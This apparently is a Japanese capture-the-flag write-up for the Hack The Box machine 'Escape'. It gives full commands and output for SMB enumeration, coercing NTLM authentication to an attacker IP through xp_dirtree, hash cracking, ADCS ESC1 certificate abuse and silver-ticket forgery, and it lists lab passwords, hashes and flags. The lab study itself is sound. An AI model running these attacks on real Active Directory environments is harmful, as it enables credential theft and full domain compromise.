https://app.hackthebox.com/machines/Escape

## STEP 1
```sh
└─$ rustscan -a 10.129.80.180 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.80.180:53
Open 10.129.80.180:88
Open 10.129.80.180:445
Open 10.129.80.180:593
Open 10.129.80.180:636
Open 10.129.80.180:1433
Open 10.129.80.180:3268
Open 10.129.80.180:3269
Open 10.129.80.180:5985
Open 10.129.80.180:9389
Open 10.129.80.180:49667
Open 10.129.80.180:49690
Open 10.129.80.180:49689
Open 10.129.80.180:49711
Open 10.129.80.180:49721
Open 10.129.80.180:49742
10.129.80.180 -> [53,88,445,593,636,1433,3268,3269,5985,9389,49667,49690,49689,49711,49721,49742]
```


## STEP 2
guestでsmb列挙
```sh
└─$ netexec smb 10.129.80.180 -u ' ' -p '' --shares
SMB         10.129.80.180  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.80.180  445    DC               [+] sequel.htb\ : (Guest)
SMB         10.129.80.180  445    DC               [*] Enumerated shares
SMB         10.129.80.180  445    DC               Share           Permissions     Remark
SMB         10.129.80.180  445    DC               -----           -----------     ------
SMB         10.129.80.180  445    DC               ADMIN$                          Remote Admin
SMB         10.129.80.180  445    DC               C$                              Default share
SMB         10.129.80.180  445    DC               IPC$            READ            Remote IPC
SMB         10.129.80.180  445    DC               NETLOGON                        Logon server share 
SMB         10.129.80.180  445    DC               Public          READ            
SMB         10.129.80.180  445    DC               SYSVOL                          Logon server share
```
pdfファイルを発見・ダウンロード
```sh
└─$ smbclient -N -c ls //10.129.80.180/Public          
  .                                   D        0  Sat Nov 19 11:51:25 2022
  ..                                  D        0  Sat Nov 19 11:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022

                5184255 blocks of size 4096. 1447083 blocks available

└─$ smbget -N 'smb://10.129.80.180/Public/SQL Server Procedures.pdf'
Using domain: WORKGROUP, user: kali
smb://10.129.80.180/Public/SQL Server Procedures.pdf 
Downloaded 48.39kB in 15 seconds
```
pdfはmssqlに関するもの、step1で1433番がオープンであったことを確認したのでmssqlが動作していると推測  
ユーザ名`PublicUser`パスワード`GuestUserCantWrite1@`を確認
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Escape_01.png">  
pdfのクレデンシャルでmssqlにログイン成功
```sh
└─$ impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@10.129.80.180'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```


## STEP 3
あまり使わないmetasploitでmssqlの情報を列挙  
xp_cmdshellは無効だが、xp_dirtreeは使用可能みたい  
```sh
msf auxiliary(scanner/mssql/mssql_login) > use auxiliary/admin/mssql/mssql_enum
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

msf auxiliary(admin/mssql/mssql_enum) > set database master
database => master

msf auxiliary(admin/mssql/mssql_enum) > set username PublicUser
username => PublicUser

msf auxiliary(admin/mssql/mssql_enum) > set password GuestUserCantWrite1
password => GuestUserCantWrite1

msf auxiliary(admin/mssql/mssql_enum) > set rhosts 10.129.80.180
rhosts => 10.129.80.180

msf auxiliary(admin/mssql/mssql_enum) > run
[*] Running module against 10.129.80.180
[*] 10.129.80.180:1433 - Running MS SQL Server Enumeration...
[*] 10.129.80.180:1433 - Version:
[*]     Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
[*]             Sep 24 2019 13:48:23 
[*]             Copyright (C) 2019 Microsoft Corporation
[*]             Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
[*] 10.129.80.180:1433 - Configuration Parameters:
[*] 10.129.80.180:1433 -       C2 Audit Mode is Not Enabled
[*] 10.129.80.180:1433 -       xp_cmdshell is Not Enabled
[*] 10.129.80.180:1433 -       remote access is Enabled
[*] 10.129.80.180:1433 -       allow updates is Not Enabled
[*] 10.129.80.180:1433 -       Database Mail XPs is Not Enabled
[*] 10.129.80.180:1433 -       Ole Automation Procedures are Not Enabled
[*] 10.129.80.180:1433 - Databases on the server:
[*] 10.129.80.180:1433 -       Database name:master
[*] 10.129.80.180:1433 -       Database Files for master:
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
[*] 10.129.80.180:1433 -       Database name:tempdb
[*] 10.129.80.180:1433 -       Database Files for tempdb:
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\tempdb.mdf
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\templog.ldf
[*] 10.129.80.180:1433 -       Database name:model
[*] 10.129.80.180:1433 -       Database Files for model:
[*] 10.129.80.180:1433 -       Database name:msdb
[*] 10.129.80.180:1433 -       Database Files for msdb:
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBData.mdf
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBLog.ldf
[*] 10.129.80.180:1433 - System Logins on this Server:
[*] 10.129.80.180:1433 -       sa
[*] 10.129.80.180:1433 -       PublicUser
[*] 10.129.80.180:1433 - Disabled Accounts:
[*] 10.129.80.180:1433 -       No Disabled Logins Found
[*] 10.129.80.180:1433 - No Accounts Policy is set for:
[*] 10.129.80.180:1433 -       All System Accounts have the Windows Account Policy Applied to them.
[*] 10.129.80.180:1433 - Password Expiration is not checked for:
[*] 10.129.80.180:1433 -       sa
[*] 10.129.80.180:1433 -       PublicUser
[*] 10.129.80.180:1433 - System Admin Logins on this Server:
[*] 10.129.80.180:1433 -       sa
[*] 10.129.80.180:1433 - Windows Logins on this Server:
[*] 10.129.80.180:1433 -       No Windows logins found!
[*] 10.129.80.180:1433 - Windows Groups that can logins on this Server:
[*] 10.129.80.180:1433 -       No Windows Groups where found with permission to login to system.
[*] 10.129.80.180:1433 - Accounts with Username and Password being the same:
[*] 10.129.80.180:1433 -       No Account with its password being the same as its username was found.
[*] 10.129.80.180:1433 - Accounts with empty password:
[*] 10.129.80.180:1433 -       No Accounts with empty passwords where found.
[*] 10.129.80.180:1433 - Stored Procedures with Public Execute Permission found:
[*] 10.129.80.180:1433 -       sp_replsetsyncstatus
[*] 10.129.80.180:1433 -       sp_replcounters
[*] 10.129.80.180:1433 -       sp_replsendtoqueue
[*] 10.129.80.180:1433 -       sp_resyncexecutesql
[*] 10.129.80.180:1433 -       sp_prepexecrpc
[*] 10.129.80.180:1433 -       sp_repltrans
[*] 10.129.80.180:1433 -       sp_xml_preparedocument
[*] 10.129.80.180:1433 -       xp_qv
[*] 10.129.80.180:1433 -       xp_getnetname
[*] 10.129.80.180:1433 -       sp_releaseschemalock
[*] 10.129.80.180:1433 -       sp_refreshview
[*] 10.129.80.180:1433 -       sp_replcmds
[*] 10.129.80.180:1433 -       sp_unprepare
[*] 10.129.80.180:1433 -       sp_resyncprepare
[*] 10.129.80.180:1433 -       sp_createorphan
[*] 10.129.80.180:1433 -       xp_dirtree
[*] 10.129.80.180:1433 -       sp_replwritetovarbin
[*] 10.129.80.180:1433 -       sp_replsetoriginator
[*] 10.129.80.180:1433 -       sp_xml_removedocument
[*] 10.129.80.180:1433 -       sp_repldone
[*] 10.129.80.180:1433 -       sp_reset_connection
[*] 10.129.80.180:1433 -       xp_fileexist
[*] 10.129.80.180:1433 -       xp_fixeddrives
[*] 10.129.80.180:1433 -       sp_getschemalock
[*] 10.129.80.180:1433 -       sp_prepexec
[*] 10.129.80.180:1433 -       xp_revokelogin
[*] 10.129.80.180:1433 -       sp_execute_external_script
[*] 10.129.80.180:1433 -       sp_resyncuniquetable
[*] 10.129.80.180:1433 -       sp_replflush
[*] 10.129.80.180:1433 -       sp_resyncexecute
[*] 10.129.80.180:1433 -       xp_grantlogin
[*] 10.129.80.180:1433 -       sp_droporphans
[*] 10.129.80.180:1433 -       xp_regread
[*] 10.129.80.180:1433 -       sp_getbindtoken
[*] 10.129.80.180:1433 -       sp_replincrementlsn
[*] 10.129.80.180:1433 - Instances found on this server:
[*] 10.129.80.180:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 10.129.80.180:1433 -       xp_regread might be disabled in this system
[*] Auxiliary module execution completed
```
ということで、ストアドプロシージャのxp_dirtreeでkaliに認証リクエストを飛ばしクレデンシャルをキャプチャ
```sh
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.28\share
subdirectory   depth   file   
------------   -----   ---- 
```
ユーザ名sql_svcのntハッシュを取得！
```sh
└─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.28]
    Responder IPv6             [dead:beef:4::101a]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-1LRZOH31C2F]
    Responder Domain Name      [548O.LOCAL]
    Responder DCE-RPC Port     [49472]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                            

[SMB] NTLMv2-SSP Client   : 10.129.80.180
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:b964916c38c95c45:E50990E2249A62E23A3F59AD32B1FA11:010100000000000080FCBBD78644DC017B47D91AF8DF22A000000000020008003500340038004F0001001E00570049004E002D0031004C0052005A004F0048003300310043003200460004003400570049004E002D0031004C0052005A004F004800330031004300320046002E003500340038004F002E004C004F00430041004C00030014003500340038004F002E004C004F00430041004C00050014003500340038004F002E004C004F00430041004C000700080080FCBBD78644DC01060004000200000008003000300000000000000000000000003000004136924FE60D10CB1E5AA1D1FD8055AA7669D12D66160B96227646026A91227D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320038000000000000000000
```
sql_svcのntハッシュをクラック成功  
パスワードは、REGGIE1234ronnieと判明
```sh
└─$ name-that-hash -f sql_svc.txt --no-banner

sql_svc::sequel:b964916c38c95c45:E50990E2249A62E23A3F59AD32B1FA11:010100000000000080FCBBD78644DC017B47D91AF8DF22A000000000020008003500340038004F0001001E00570049004E002
D0031004C0052005A004F0048003300310043003200460004003400570049004E002D0031004C0052005A004F004800330031004300320046002E003500340038004F002E004C004F00430041004C0003001400
3500340038004F002E004C004F00430041004C00050014003500340038004F002E004C004F00430041004C000700080080FCBBD78644DC010600040002000000080030003000000000000000000000000030000
04136924FE60D10CB1E5AA1D1FD8055AA7669D12D66160B96227646026A91227D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E
00320038000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2

└─$ hashcat -a 0 -m 5600 sql_svc.txt /usr/share/wordlists/rockyou.txt --quiet
SQL_SVC::sequel:b964916c38c95c45:e50990e2249a62e23a3f59ad32b1fa11:010100000000000080fcbbd78644dc017b47d91af8df22a000000000020008003500340038004f0001001e00570049004e002d0031004c0052005a004f0048003300310043003200460004003400570049004e002d0031004c0052005a004f004800330031004300320046002e003500340038004f002e004c004f00430041004c00030014003500340038004f002e004c004f00430041004c00050014003500340038004f002e004c004f00430041004c000700080080fcbbd78644dc01060004000200000008003000300000000000000000000000003000004136924fe60d10cb1e5aa1d1fd8055aa7669d12d66160b96227646026a91227d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320038000000000000000000:REGGIE1234ronnie
```
STEP1で5985番オープンを確認、またsql_svcはwinrmログイン可能を確認
```sh
└─$ netexec ldap 10.129.80.180 -u 'sql_svc' -p 'REGGIE1234ronnie' --groups 'Remote Management Users'
LDAP        10.129.80.180   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       10.129.80.180   636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
LDAPS       10.129.80.180   636    DC               sql_svc
LDAPS       10.129.80.180   636    DC               Ryan.Cooper
```
winrmログイン成功
```powershell
└─$ evil-winrm -i 10.129.80.180 -u sql_svc -p REGGIE1234ronnie
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\users\sql_svc\documents>
```


## STEP 4
ログファイル内に、ユーザ名Ryan.Cooperのログイン失敗を確認  
その後にユーザ名`NuclearMosquito3`で認証失敗を確認したが、こいつがパスワードかも
```powershell
*Evil-WinRM* PS C:\users\sql_svc\documents> cat C:\SQLServer\Logs\ERRORLOG.BAK

~~~

2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a 'stop' request from Service Control Manager. This is an informational message only. No user action is required.
2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
2022-11-18 13:43:09.43 spid9s      SQL Trace was stopped due to server shutdown. Trace ID = '1'. This is an informational message only; no user action is required.
```
step3でRyan.Cooperもwinrmログイン可能と確認  
ということでログイン成功、ユーザフラグゲット
```powershell
└─$ evil-winrm -i 10.129.80.180 -u Ryan.Cooper -p NuclearMosquito3
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cat ../desktop/user.txt
4ac86daa61bf3a9b8a9202dfad7e1b9c
```


## STEP 5
### PATH 1
adcsの存在を確認
```sh
└─$ netexec ldap 10.129.80.180 -u Ryan.Cooper -p NuclearMosquito3 -M adcs   
LDAP        10.129.80.180   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       10.129.80.180   636    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 
ADCS        10.129.80.180   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.80.180   389    DC               Found PKI Enrollment Server: dc.sequel.htb
ADCS        10.129.80.180   389    DC               Found CN: sequel-DC-CA
```
ESC1に該当する脆弱なテンプレートを発見
```sh
└─$ certipy-ad find -stdout -target 10.129.80.180 -enabled -vulnerable -u ryan.cooper -p NuclearMosquito3
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
administratorのpfxを取得できた
```sh
└─$ certipy-ad req -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -out administrator -target 10.129.80.180 -u ryan.cooper -p NuclearMosquito3
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
pfxからntハッシュを取得できた
```sh
└─$ certipy-ad auth -pfx administrator.pfx -no-save -dc-ip 10.129.80.180            
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
winrmログイン成功  
ルートフラグゲット
```sh
└─$ evil-winrm -i 10.129.80.180 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
b5a13a12aae3171df977e2c051d44261
```


### PATH 2
[リンク](https://0xdf.gitlab.io/2023/06/17/htb-escape.html)  
step3でmssqlを実行しているユーザsql_svcのクレデンシャルを取得したが、そのクレデンシャルを使用してmssqlのsilverチケットを作成が可能  
administratorに偽装したsilverチケットでmssqlにログインが可能  
silverチケットを作成するためにさらに必要な情報は以下の３つ
1. サービスのntハッシュ
2. ドメインのsid
3. spn

sql_svcの平文パスワードは取得したため、平文パスワードのmd4値を取得
```sh
└─$ python3.13 -c "import hashlib; print(hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).hexdigest())"
1443ec19da4dac4ffc953bca1b57b4cf
```
ドメインのsidを取得
```sh
└─$ netexec ldap 10.129.80.180 -u 'sql_svc' -p 'REGGIE1234ronnie' --get-sid    
LDAP        10.129.80.180  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       10.129.80.180  636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
LDAPS       10.129.80.180  636    DC               Domain SID S-1-5-21-4078382237-1492182817-2568127209
```
今回はmssqlのspnは確認できず、しかし偽装したspnを設定可能らしい
```sh
└─$ netexec ldap 10.129.80.180 -u 'sql_svc' -p 'REGGIE1234ronnie' --query '(servicePrincipalName=*)' 'servicePrincipalName'
LDAP        10.129.80.180  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       10.129.80.180  636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
LDAPS       10.129.80.180  636    DC               [+] Response for object: CN=DC,OU=Domain Controllers,DC=sequel,DC=htb
LDAPS       10.129.80.180  636    DC               servicePrincipalName Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.sequel.htb
LDAPS       10.129.80.180  636    DC                                    ldap/dc.sequel.htb/ForestDnsZones.sequel.htb
LDAPS       10.129.80.180  636    DC                                    ldap/dc.sequel.htb/DomainDnsZones.sequel.htb
LDAPS       10.129.80.180  636    DC                                    DNS/dc.sequel.htb
LDAPS       10.129.80.180  636    DC                                    GC/dc.sequel.htb/sequel.htb
LDAPS       10.129.80.180  636    DC                                    RestrictedKrbHost/dc.sequel.htb
LDAPS       10.129.80.180  636    DC                                    RestrictedKrbHost/DC
LDAPS       10.129.80.180  636    DC                                    RPC/e758bd70-a92f-4f87-96f4-522f614c2fee._msdcs.sequel.htb
LDAPS       10.129.80.180  636    DC                                    HOST/DC/sequel
LDAPS       10.129.80.180  636    DC                                    HOST/dc.sequel.htb/sequel
LDAPS       10.129.80.180  636    DC                                    HOST/DC
LDAPS       10.129.80.180  636    DC                                    HOST/dc.sequel.htb
LDAPS       10.129.80.180  636    DC                                    HOST/dc.sequel.htb/sequel.htb
LDAPS       10.129.80.180  636    DC                                    E3514235-4B06-11D1-AB04-00C04FC2DCD2/e758bd70-a92f-4f87-96f4-522f614c2fee/sequel.htb
LDAPS       10.129.80.180  636    DC                                    ldap/DC/sequel
LDAPS       10.129.80.180  636    DC                                    ldap/e758bd70-a92f-4f87-96f4-522f614c2fee._msdcs.sequel.htb
LDAPS       10.129.80.180  636    DC                                    ldap/dc.sequel.htb/sequel
LDAPS       10.129.80.180  636    DC                                    ldap/DC
LDAPS       10.129.80.180  636    DC                                    ldap/dc.sequel.htb
LDAPS       10.129.80.180  636    DC                                    ldap/dc.sequel.htb/sequel.htb
LDAPS       10.129.80.180  636    DC               [+] Response for object: CN=krbtgt,CN=Users,DC=sequel,DC=htb
LDAPS       10.129.80.180  636    DC               servicePrincipalName kadmin/changepw
```
ということで、administratorに偽装したsilverチケットを作成  
存在しないユーザ名を指定したが、ridは500を指定しているためadministratorとして処理される
```sh
└─$ impacket-ticketer -spn 'test/dc.sequel.htb' -domain sequel.htb -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -nthash 1443ec19da4dac4ffc953bca1b57b4cf test
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sequel.htb/test
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in test.ccache
```
```sh
└─$ impacket-describeTicket --rc4 1443ec19da4dac4ffc953bca1b57b4cf test.ccache 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 4774427770574247736c42705545584a
[*] User Name                     : test
[*] User Realm                    : SEQUEL.HTB
[*] Service Name                  : test/dc.sequel.htb
[*] Service Realm                 : SEQUEL.HTB
[*] Start Time                    : 26/10/2025 00:44:54 AM
[*] End Time                      : 24/10/2035 00:44:54 AM
[*] RenewTill                     : 24/10/2035 00:44:54 AM
[*] Flags                         : (0x50a00000) forwardable, proxiable, renewable, pre_authent
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : R3RCd3BXQkdzbEJwVUVYSg==
[*] Kerberoast hash               : $krb5tgs$23$*USER$SEQUEL.HTB$test/dc.sequel.htb*$2d5a4b1b1bce131d4ec820d03c473f53$e1fc361f3de05b7665c6f450099d0f8e4acc8d4923ef37b1dd54e7648c3cbee0acd2fab0ce096a7520b2fa72fab5cc91fd6f1b05e2d6a8a3ab862f58a68ed76f8fa90b6763c4355ba9c91b1954c224b4dfaf2e711fc746db0bece81e56273314521c681caf4ed1c1ac5930374d86e3b8ccbb745aea22eafb24d2aa753a4d698e7da8c32f912cceb45dbd37f6e65a02cdd4c6592a9b1a59078b79efa3bf6c8f78737605226e66b8974d846c2ac6ce784d3e497f224a83f2531f2c6521d1cfbec709157d005c64beb6c1230b1f01b8d612a47e3ce67a71746c9c8f2980fbbccba872aa99a621e5897775e3021a2b7c96bcee77a2295f4355a91e4bef238ca92e1f681bfe6ee94b200605a6bb3af065014028fc9add8156442137c7899674b99fafb752cb33db174707992fd7845f762df6a425a5d0432d5529c7d202196438d7e783f4b097acd9201116233cc10030b59b7db10d85552ff0252f694dc4196418249366098e9e2d15fd225d48aee05f8f8aafefe9813b362adfe0971518b1c7a5109e7ca2d1fd5b273b10541b5fefcda834d77c31d8ee2c2badf317985bf94919ad9357aac51a378d5982f8aee3a14903a87d7a5666ab5e498991f3b67f39ea7341f1a15f34b2f7c8cd5cbcbd96e40da1c902e78bce96d3ee9e0b700cc056196f6e500af27e41bbb9e22bf4538d4116d6232c628688104765ea0284fb2e61617cc2fc5a99b68a26d5dec5156b54409c10ec747b9033da7cbb915fb7fdce18cc69a42d8b4a293d567a1044a4e6bad08a951c72bc9cb818eac8011ee38af7d51521fa26ac86dc19a49dd054fdf056c02118be570c69508589c5e077979d318a9583b06b327876a488a1c8ba8bab034611a2b5b3d7c2c1cae0f0de535de9ac2db8162e821ef9eb18d64132e7f3c02e9d8bf0c08baba906f6e20e74be6eba031cdd264797c438f41ea0b4e9dd5647c9aee7ca8ecf18d5be0c87273bd22501af03d178286a9c9c72db698435e91054987dfcf71dd40d6a30aed92981d690085500867ec5fbfafa30b07111d5fd38a72f